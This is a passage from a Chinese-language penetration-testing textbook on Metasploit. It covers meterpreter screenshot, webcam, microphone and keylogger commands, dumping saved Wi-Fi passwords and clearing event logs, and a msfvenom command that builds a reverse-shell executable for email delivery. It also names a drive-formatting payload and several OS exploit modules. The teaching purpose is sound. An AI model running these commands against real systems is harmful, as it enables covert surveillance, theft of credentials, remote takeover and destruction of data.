
```
meterpreter > enumdesktops
Enumerating all accessible desktops

Desktops
========

Session Station Name
-------- -------- ----
1 WinSta0 Default

meterpreter > getdesktop 1
Session 1\WinSta0\Default
meterpreter > 
```

FIGURE 14-6 使用桌面。

其中一个令人着迷的事情是，你可以对桌面进行快照。如图 14-7 所示，只需输入以下命令：

```
screenshot
```

```
meterpreter > getdesktop 1
Session 1\WinSta0\Default
meterpreter > screenshot
Screenshot saved to: /root/vAdCfQYx.jpeg
meterpreter > 
```

FIGURE 14-7 屏幕截图。

图 14-8 是来自目标桌面的实际屏幕截图。

![](img/fa54c6d61c14db5421f8f63e6d594bb5_338_0.png)

FIGURE 14-8 实际屏幕截图。

## 相机

当我教授 Metasploit 时，学生们总是喜欢捕获目标机器的网络摄像头。这些命令在第 13 章中提到过，但在这里会提供更多细节。从渗透测试的角度来看，没有什么比向高管展示用他自己的网络摄像头拍摄的图片更能强调安全需求的了。从攻击者的角度来看，网络摄像头显然是一个强大的攻击向量。

第一步就是简单地输入命令

```
webcam_list
```

如果目标连接了任何网络摄像头，它们将被列出。然后你可以使用以下任一命令

```
webcam_snap
```

或

```
webcam_stream
```

如果没有错误，使用 webcam_snap 你将获得摄像头的静态图像，或使用 webcam_stream 进行实时视频流。

如果目标有麦克风，你也可以尝试：

```
record_mic
```

这些命令都非常简单——要么成功，要么失败；没有需要排查的问题。如果命令失败，可能是目标有网络摄像头或麦克风，但未正确配置。

## 键盘记录器

你还可以实时记录目标系统上的用户正在输入的内容。你从以下开始：

```
keyscan_start
```

然后完成时，输入：

```
keyscan_dump
```

图 14-9 显示了结果。

![](img/fa54c6d61c14db5421f8f63e6d594bb5_339_0.png)

FIGURE 14-9 键盘记录。

也可以使用以下命令进行变体：

```
use post/windows/capture/keylog_recorder
```

## 其他信息

有几个其他命令可以从目标机器获取信息。这些命令中的每一个对你运行都可能有用。以下是其中几个：

- **run get_application_list**：这将列出目标上安装的所有应用程序，除操作系统自带的应用外。这在第 13 章中提到过。
- **run post/windows/wlan/wlan_profile**：这将列出目标计算机连接过的所有无线局域网的完整配置文件，包括密码。
- **clearev**：这是一个重要的命令。这将清除事件日志。从渗透测试的角度来看，你可能希望避免使用它，因为它会清除目标系统上的所有日志。
- **run event_manager -i**：这比 **clearev** 更好的选择。此命令让你与事件管理器交互。

## msfvenom

msfvenom 本质上结合了 msfpayload 和 msfencode，以便你可以对有效载荷进行编码然后发送到目标。它是一个强大的工具，是你应该熟悉的 Metasploit 的一部分。它在 Kali 中从 shell 使用，而不是在 Metasploit 内部使用。你可以先尝试 **msfvenom -h**，如图 14-10 所示。

![](img/fa54c6d61c14db5421f8f63e6d594bb5_340_0.png)

FIGURE 14-10 msfvenom -h.

你可以使用命令 **msfvenom -l payloads** 列出所有可用的有效载荷，如图 14-11 所示。

![](img/fa54c6d61c14db5421f8f63e6d594bb5_341_0.png)

FIGURE 14-11 **msfvenom 有效载荷。**

两个最重要的标志是 **-p**，它定义你要部署的有效载荷，以及 **-f**，它定义格式。你想部署可执行文件？PDF 文件？AVI 文件？这些都是选项。

让我们看一个例子。假设你想将反向 tcp shell 部署为可执行文件：

```
windows/meterpreter/reverse_tcp
```

然后你将把该可执行文件发送到目标，也许作为电子邮件附件。如果你的 IP 地址是 192.168.56.101，那么你的整个命令是：

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.101 lport=4444 -f exe -o mypayload.exe
```

你可以在图 14-12 中看到这一点。现在忽略未选择架构的消息；我们稍后会处理这个问题。

![](img/fa54c6d61c14db5421f8f63e6d594bb5_341_1.png)

FIGURE 14-12 向目标发送可执行文件。

现在，如果你在 Kali 机器上导航到默认目录，你将找到 mypayload.exe，如图 14-13 所示。

![](img/fa54c6d61c14db5421f8f63e6d594bb5_342_0.png)

FIGURE 14-13 mypayload.exe.

我之前提到我们忽略了架构。有效载荷必须针对特定的计算机架构进行定制。如果不选择一个，msfvenom 将默认为 x86 架构。

现在你对如何使用 msfvenom 有了基本了解，让我们更仔细地看看标志。以下是最重要的标志：

- **-p** 指定你要交付的 Metasploit 有效载荷。
- **-f** 指定输出格式（.exe、.avi、.pdf 等）。
- **-e** 指定你要使用的编码器。
- **-a** 指定要攻击的目标架构（默认为 x86）。

这些并不是唯一的标志，但它们是最关键且最常用的标志。我们尚未使用过的一个标志是 -Platform。它针对你试图攻击的特定平台。该标志有许多选项，其中一些列在这里：

- Windows or windows
- OSX or osx
- Solaris or solaris
- BSD or bsd
- OpenBSD or openbsd
- Unix or unix
- Linux or linux
- Cisco or cisco
- Android or android

请注意，你可以选择大写首字母，也可以不。因此，把所有内容放在一起，这里是我们之前示例中选择了所有标志的情况：

```
msfvenom -a x86 --platform Windows -p windows/meterpreter/
reverse_tcp lhost=192.168.56.101 lport=4444 -f exe -o mypayload.exe
```

你可以使用 msfvenom 将任何 Metasploit 有效载荷，甚至你自己创建的自定义有效载荷，放入文件中。然后如何将它交付给目标就由你决定了。电子邮件附件仍然是一种非常有效的方式。

## 更多 Metasploit 攻击

在第 13 章中，我们专注于保证有效的攻击，至少在没有服务包的 Windows 7 目标上。概念是让你习惯如何使用 Metasploit，在一个保证成功的环境中。然而，你可能已经意识到这是一个人为的场景，与现实世界系统相差甚远。在本节中，我们将研究对各种目标的攻击。然而，没有任何一种是保证有效的。你可能会尝试其中每一个，但只有一两个能成功。然而，是时候让你进入 Metasploit 学习中的下一阶段，并更接近现实世界的场景了。

## 格式化所有驱动器

此漏洞利用最好作为 msfvenom 模块交付。我警告你，这个非常具有破坏性。我不建议在渗透测试中使用它。然而，它可以在测试机器上使用，只是为了强调附件可能造成的破坏程度。顾名思义，它旨在格式化目标机器上的所有驱动器。并且易于使用，如图 14-14 所示。

![](img/fa54c6d61c14db5421f8f63e6d594bb5_343_0.png)

FIGURE 14-14 格式化所有驱动器。

很难夸大你在使用此类漏洞利用时应多么谨慎。

## 攻击 Windows Server 2008 R2

你可能会想，为什么我们要处理如此旧的服务器操作系统？特别是对于服务器来说，较旧的操作系统相当常见。

此漏洞利用本应影响 Windows Server 2008 R2，尽管我发现它成功率不稳定。该漏洞利用，如图 14-15 所示，是 **exploit/windows/local/ms14_058_track_popup_menu**。

![](img/fa54c6d61c14db5421f8f63e6d594bb5_344_0.png)

此漏洞利用基于 win32k.sys 中的漏洞，涉及空指针解引用。它在 TrackPopupMenu API 调用中使用，在某些情况下可用于执行代码。该漏洞利用的作者声称它已成功在 Windows Server 2003 SP2、Windows 2008 R2 以及 Windows 7 上执行。你可以在 https://www.rapid7.com/db/modules/exploit/windows/local/ms14_058_track_popup_menu 获取有关此攻击的更多详细信息。

## 通过 Office 攻击 Windows

据称，此特定漏洞利用可在 Windows Vista、Windows 8、Server 2008 和 Server 2012 上运行，前提是 Windows 操作系统运行 Office 2010 或 2013。该漏洞利用，如图 14-16 所示，是 **exploit/windows/fileformat/ms14_060_sandworm**。

## 攻击 Linux

Windows 并不是你可以用 Metasploit 攻击的唯一操作系统。此漏洞利用攻击 Linux。它基于 Linux 内核缺陷。如图 14-17 所示，使用 **exploit/linux/local/sock_sendpage**。为了测试目的，Metasploit 提供了一个 Metasploitable Linux 虚拟机，你可以从 https://information.rapid7.com/metasploitable-download.html 免费下载。

